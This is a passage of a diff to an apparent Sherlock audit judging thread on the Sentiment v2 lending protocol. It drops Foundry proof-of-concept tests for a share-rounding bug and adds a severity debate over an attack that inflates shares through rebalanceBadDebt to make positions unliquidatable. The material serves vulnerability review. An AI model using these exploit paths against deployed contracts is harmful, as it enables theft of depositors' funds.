+The loss incured by the protocol far exceeds the loss that the attacker will incur. This is clarified in the earlier [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/585#issuecomment-2359983774) and accepted [here](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/585#issuecomment-2359997486)
+
+**cvetanovv**
+
+@ruvaag can I have your opinion?
+
+**cvetanovv**
+
+After reviewing the issue again, I agree with @10xhash points.
+
+While the exploit is complex and requires specific conditions, it is possible for an attacker to manipulate the pool and leverage the rebalanceBadDebt function to inflate shares, causing overflows and rendering positions unliquidatable.
+
+I am planning to reject the escalation and leave the issue as is.
+
+**0xjuaan**
+
+@cvetanovv please consider this:
+
+The protocol clearly states in the README that maxLTV will be set to 98%
+>Max LTV = 98% = 980000000000000000
+
+When setting a pool's LTV, it MUST abide by this [limit](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L173-L174):
 ```solidity
-function testTimeIncreasesDebt(uint96 assets) public {
-        testBorrowWorksAsIntended(assets);
-
-        (,,,,,,, uint256 totalBorrowAssets, uint256 totalBorrowShares,,) = pool.poolDataFor(linearRatePool);
-        console.log("totalBorrowAssets -> ", totalBorrowAssets);
-        console.log("totalBorrowShares -> ", totalBorrowShares);
-
-        uint256 time = block.timestamp + 1 days;
-        vm.warp(time + 86_400 * 7);
-        vm.roll(block.number + ((86_400 * 7) / 2));
-
-        pool.accrue(linearRatePool);
-
-        (,,,,,,, uint256 newTotalBorrowAssets, uint256 newTotalBorrowShares,,) = pool.poolDataFor(linearRatePool);
-        console.log("newTotalBorrowAssets -> ", newTotalBorrowAssets);
-        console.log("newTotalBorrowShares -> ", newTotalBorrowShares);
-        console.log("shares first -> ", pool.balanceOf(user, linearRatePool));
-        console.log("assets -> ",assets);
-
-        (uint256 depositedEarlier) = pool.getAssetsOf(linearRatePool, user);
-        console.log("assets in pool before ->", depositedEarlier);
-        // (uint256 liquidity) = pool.getPoolAssetFor(linearRatePool);
-        // console.log("total assets in pool ->", liquidity);
-
-        vm.startPrank(user2);
-        asset1.mint(user2, assets);
-        asset1.approve(address(pool), assets);
-        (uint256 sharesBefore) = pool.deposit(linearRatePool, assets, user2);
-        console.log("shares minted on deposit -> ", sharesBefore);
-        (uint256 sharesAfter) = pool.withdraw(linearRatePool, assets, user2, user2);
-        console.log("shares burned on withdraw -> ", sharesAfter);
-        vm.stopPrank();
-
-        (uint256 deposited) = pool.getAssetsOf(linearRatePool, user);
-        console.log("total assets deposited ->", deposited);
-
-        assertEq(sharesBefore, sharesAfter);
-        assertEq(newTotalBorrowShares, totalBorrowShares);
-        assertGt(newTotalBorrowAssets, totalBorrowAssets);
-    }
+// ensure new ltv is within global limits. also enforces that an existing ltv cannot be updated to zero
+if (ltv < minLtv || ltv > maxLtv) revert RiskEngine_LtvLimitBreached(ltv);
 ```
 
-In Superpool.t.sol
+This means that the LTV cannot be set to 100% by the attacker, which is a requirement for the attack to work. Hence, the attack won't work.
 
-```solidity
-function testInterestEarnedOnTheUnderlingPool() public {
-        // 1. Setup a basic pool with an asset1
-        // 2. Add it to the superpool
-        // 3. Deposit assets into the pool
-        // 4. Borrow from an alternate account
-        // 5. accrueInterest
-        // 6. Attempt to withdraw all of the liquidity, and see the running out of the pool
-        vm.startPrank(poolOwner);
-        superPool.addPool(linearRatePool, 50 ether);
-        superPool.addPool(fixedRatePool, 50 ether);
-        vm.stopPrank();
+In addition, it requires the same position to reach bad debt without liquidation several times consecutively, which has extremely low likelihood. 
 
-        vm.startPrank(user);
-        asset1.mint(user, 50 ether);
-        asset1.approve(address(superPool), 50 ether);
 
-        vm.expectRevert();
-        superPool.deposit(0, user);
+**cvetanovv**
 
-        superPool.deposit(50 ether, user);
-        vm.stopPrank();
+> @cvetanovv please consider this:
+> 
+> The protocol clearly states in the README that maxLTV will be set to 98%
+> 
+> > Max LTV = 98% = 980000000000000000
+> 
+> When setting a pool's LTV, it MUST abide by this [limit](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskEngine.sol#L173-L174):
+> 
+> ```solidity
+> // ensure new ltv is within global limits. also enforces that an existing ltv cannot be updated to zero
+> if (ltv < minLtv || ltv > maxLtv) revert RiskEngine_LtvLimitBreached(ltv);
+> ```
+> 
+> This means that the LTV cannot be set to 100% by the attacker, which is a requirement for the attack to work. Hence, the attack won't work.
+> 
+> In addition, it requires the same position to reach bad debt without liquidation several times consecutively, which has extremely low likelihood.
 
-        vm.startPrank(Pool(pool).positionManager());
-        Pool(pool).borrow(linearRatePool, user, 35 ether);
-        vm.stopPrank();
+@0xjuaan I agree with this, but as far as I understood, the attack is also possible with LTV 98%. Or did I not understand correctly? 
 
-        vm.warp(block.timestamp + 365 days);
-        vm.roll(block.number + 5_000_000);
-        pool.accrue(linearRatePool);
+**0xjuaan**
 
-        vm.startPrank(user2);
-        asset1.mint(user2, 421 ether);
-        asset1.approve(address(superPool), 421 ether);
+You're right, it is *technically* possible if liquidators choose not to earn free profits, but isn't it too far fetched to assume that liquidators will not liquidate such a position on multiple consecutive instances when they can earn a 2% profit?
 
-        (uint256 sharesMinted) = superPool.deposit(421 ether, user2);
-        console.log("Shares Minted ->", sharesMinted);
-        (uint256 sharesBurned) = superPool.withdraw(421 ether, user2, user2);
-        console.log("Shares Burned ->", sharesBurned);
-        vm.stopPrank();
+**cvetanovv**
 
-        vm.startPrank(Pool(pool).positionManager());
-        uint256 borrowsOwed = pool.getBorrowsOf(linearRatePool, user);
+@0xjuaan Yes, this issue is borderline Medium/Low, and it is hard to judge if it is valid or not(Low severity). 
 
-        asset1.mint(Pool(pool).positionManager(), borrowsOwed);
-        asset1.approve(address(pool), borrowsOwed);
-        Pool(pool).repay(linearRatePool, user, borrowsOwed);
-        vm.stopPrank();
+What I can point out as another augment that maybe the attack is very difficult to accomplish is that the Readme states that there will be Liquidator bots:
 
-        superPool.accrue();
+> **Are there any off-chain mechanisms or off-chain procedures for the protocol (keeper bots, arbitrage bots, etc.)?**
+> - Liquidator bots: maintain protocol solvency through timely liquidation of risky positions Reallocation bots: used to rebalance SuperPool deposits among respective base pools
 
-        vm.startPrank(user);
-        vm.expectRevert(); // Not enough liquidity
-        superPool.withdraw(40 ether, user, user);
-        vm.stopPrank();
+However, there is still a situation in which this attack can be executed. The malicious user will have to wait for high volatility in the market and simultaneously preform the attack before the bots liquidate the position, which is very difficult.
 
-        vm.startPrank(poolOwner);
-        vm.expectRevert(); // Cant remove a pool with liquidity in it
-        superPool.removePool(linearRatePool, false);
-        vm.stopPrank();
-    }
-```
+Because of that, I think it is rather Low severity. @10xhash, if you want, you can provide new arguments in favor of it being Medium.
 
-### Mitigation
+Planning to accept the escalation and invalidate the issue.
 
-Changing `Math.Rounding.Up` to `Mat.Rounding.Down` in [Pool.sol:350](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L350) solves the issue.
+**10xhash**
+
+LTV=98%, oracle possible deviation is >= 2%
+Min Debt = from 0 to 0.05 ETH
+Liquidation Fee = 0 (Might be increased to 20-30% in the future)
+
+There are multiple scenarios where an attacker can create positions that will make liquidators have to suffer losses in order to liquidate:
+1. High LTV wait for oracle deviation of >= 2%
+2. High LTV, low min debt
+3. High LTV, higher liquidation fees
+
+The protocol is not planned to stop an attacker from accruing bad debt to oneself
+
+**cvetanovv**
+
+On that issue, I changed my mind a few times because each comment changed my mind slightly one way or the other.
+
+There is another issue in this contest related to High TVL and the risk of bad debt due to price volatility. There is a valid situation where the price can fall by more than 2%, I see no reason why it should not apply here.
+
+Therefore, my last decision is to reject the escalation.
+
+**WangSecurity**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [EgisSecurity](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/585/#issuecomment-2352408786): rejected
 
